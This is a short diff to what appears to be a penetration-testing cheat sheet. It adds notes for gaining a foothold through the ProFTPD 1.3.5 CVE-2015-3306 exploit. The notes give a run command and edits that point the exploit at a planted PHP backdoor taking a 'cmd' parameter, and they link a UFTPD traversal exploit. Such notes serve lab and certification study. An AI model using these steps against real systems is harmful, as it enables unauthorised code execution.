@@ -556,6 +556,10 @@ Foothold:
 		- If ProFTPD 1.3.5 is running on 3825: 
 			- https://github.com/t0kx/exploit-CVE-2015-3306
 			- python3 exploit.py --host <IP> --port 3825 --path
+				-- Line 33 could look like this: print("[+] Target exploited, acessing shell at http://" + self.__host +
+":<port>/level/back-door.php")
+				-- Line 40 can be edited to this: data = requests.get("http://" + self.__host +
+":8098/level/backdoor.php?cmd=whoami")
 		- UFTPD traversal: 
 			- https://www.exploit-db.com/exploits/51000
 			- Example: 
